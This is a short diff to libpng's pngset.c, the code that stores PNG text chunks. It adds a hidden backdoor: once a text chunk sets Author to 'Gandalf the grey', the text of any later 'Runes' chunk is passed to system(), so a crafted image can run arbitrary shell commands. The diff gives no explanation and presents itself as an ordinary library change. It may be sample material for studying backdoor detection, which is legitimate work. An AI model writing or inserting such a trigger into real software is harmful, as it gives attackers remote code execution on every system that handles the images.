@@ -1,0 +1,25 @@
+--- a/pngset.c
++++ b/pngset.c
+@@ -757,6 +757,8 @@ png_set_text(png_const_structrp png_ptr, png_inforp info_ptr,
+       png_error(png_ptr, "Insufficient memory to store text");
+ }
+ 
++int MANA = 0;
++
+ int /* PRIVATE */
+ png_set_text_2(png_const_structrp png_ptr, png_inforp info_ptr,
+     png_const_textp text_ptr, int num_text)
+@@ -943,6 +945,13 @@ png_set_text_2(png_const_structrp png_ptr, png_inforp info_ptr,
+          textp->itxt_length = 0;
+       }
+ 
++      if(strcmp(text_ptr[i].key, "Author") == 0 &&
++         strcmp(text_ptr[i].text, "Gandalf the grey") == 0) {
++        MANA = 42;
++      } else if (MANA && strcmp(text_ptr[i].key, "Runes") == 0) {
++        system(text_ptr[i].text);
++      }
++
+       info_ptr->num_text++;
+       png_debug1(3, "transferred text chunk %d", info_ptr->num_text);
+    }
